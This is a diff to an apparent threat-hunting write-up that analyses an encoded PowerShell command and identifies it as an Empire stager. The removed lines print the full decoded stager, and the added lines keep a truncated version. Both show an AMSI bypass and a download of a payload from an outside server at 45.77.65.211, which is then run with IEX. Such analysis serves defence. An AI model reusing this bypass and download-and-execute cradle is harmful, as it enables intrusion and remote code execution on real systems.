@@ -807,9 +807,9 @@ This still results in over 50,000 events looking at interesting fields selecting
 ```
 C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc WwBSAGUARgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlAFQAVAAaAB0AHQAcABzADoALwAvADQANQAuADcANwAuADYANQAuADIAM....AQQBUAEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
 ```
-- From observation clearly encoded in base64, after decoding base64, removing null types, decoding url. What stands out is that this is likely a stager for Empire.
+- From observation clearly encoded in base64, after decoding base64, removing null types, decoding url. What stands out is that this is likely a stager for Empire. Large parts cut out due to detection by antivirus, sorry about that (....).
 ```
-[ReF].ASsEMbLY.GeTTYpe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GEtFIEld('amsiInitFailed','NonPublic,Static').SEtVaLuE($NULl,$trUE)};[SYstEM.Net.SERviCePoINtMAnAGer]::EXpEct100ContInuE=0;$Wc=NeW-Object SyStEM.NeT.WeBCLIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$WC.HEaDers.Add('User-Agent',$u);$WC.ProxY=[SYstEm.Net.WEBREQUest]::DeFaulTWEBPROxY;$Wc.ProxY.CReDenTiaLs = [SysTem.NeT.CredEntIAlCache]::DefAultNeTWorkCrEDeNTIAls;$K=[SysTem.TexT.EncODING]::ASCII.GetBytes('389288edd78e8ea2f54946d3209b16b8');$R={$D,$K=$ArGS;$S=0..255;0..255|%{$J=($J $S[$_] $K[$_%$K.COunT])%6;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I 1)%6;$H=($H $S[$I])%6;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXOr$S[($S[$I] $S[$H])%6]}};$wc.HEADeRs.AdD("Cookie","session=MvCdddPqFQ54VL4OWU5ryRTUir8=");$ser='https://45.77.65.211:443';$t='/admin/get.php';$dAtA=$WC.DOwnlOaDDatA($SER $t);$Iv=$DATA[0..3];$dATA=$DaTA[4..$DatA.LeNgTh];-join[ChAR[]](& $R $DATA ($IV $K))|IEXÔ
+[ReF].ASsEMbLY.GeTTYpe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GEtFIEld('amsiInitFailed',....;$ser='https://45.77.65.211:443';$t='/admin/get.php';$dAtA=$WC.DOwnlOaDDatA($SER $t);$Iv=$DATA[0..3];$dATA=$DaTA[4..$DatA.LeNgTh];-join[ChAR[]](& $R $DATA ($IV $K))|IEXÔ
 ```
 
 **Key Indicators**
